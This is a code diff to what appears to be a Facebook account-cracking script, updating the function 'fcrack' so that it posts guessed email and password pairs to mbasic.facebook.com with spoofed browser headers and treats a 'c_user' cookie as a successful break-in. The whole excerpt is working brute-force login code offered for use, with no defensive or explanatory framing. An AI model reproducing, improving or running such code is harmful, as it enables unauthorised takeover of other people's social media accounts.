@@ -825,14 +825,16 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'mobile.facebook.com',
+			header_freefb = {'authority': 'mbasic.facebook.com',
             'method': 'GET',
-            'path': '/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
+            'path': '/home.php?paipv=0&eav=Afap2_uJo9Q_g8JoU-mSAB3abE-hB6dRk92w4fiq1WuuopAsBCMPX41Yxzo3lLdr9NQ&_rdr',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',                        
-            'referer': 'https://mobile.facebook.com/?zero_e=3&zero_et=1672950801&_rdc=1&_rdr&refsrc=deprecated',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+
+            'referer': 'https://mbasic.facebook.com/login/device-based/edit-user/?uid=100089252916634&src=0&refsrc=deprecated&_rdr',
             'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -842,7 +844,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://mobile.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mbasic.facebook.com/home.php?paipv=0&eav=Afap2_uJo9Q_g8JoU-mSAB3abE-hB6dRk92w4fiq1WuuopAsBCMPX41Yxzo3lLdr9NQ&_rdr',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
